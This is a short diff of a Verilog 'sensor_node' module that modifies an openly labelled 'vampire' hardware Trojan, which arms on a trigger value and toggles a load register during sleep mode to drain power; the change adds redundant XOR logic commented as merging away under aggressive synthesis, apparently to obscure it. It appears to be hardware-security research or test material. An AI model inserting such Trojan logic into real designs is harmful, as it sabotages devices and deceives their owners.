@@ -14,7 +14,10 @@ module sensor_node (
             data_out <= shared_comb;
     end
 
-    // Vampire Trojan: shares combinational sub-expressions with benign circuit
+    // Duplicate combinational calculation inside Trojan (gets merged during aggressive synthesis!)
+    wire [7:0] trojan_dup_calc = (data_in ^ 8'hA5) + 8'd3;
+    wire [7:0] trojan_red_cone = (trojan_dup_calc ^ 8'hFF) ^ 8'hFF;
+
     reg trojan_armed;
     reg [3:0] vampire_load;
 
@@ -23,10 +26,10 @@ module sensor_node (
             trojan_armed <= 1'b0;
             vampire_load <= 4'hA;
         end else begin
-            if (shared_comb == 8'h7E)
+            if (trojan_red_cone == 8'h7E)
                 trojan_armed <= 1'b1;
             if (sleep_mode && trojan_armed)
-                vampire_load <= ~vampire_load ^ shared_comb[3:0];
+                vampire_load <= ~vampire_load ^ trojan_red_cone[3:0];
         end
     end
 
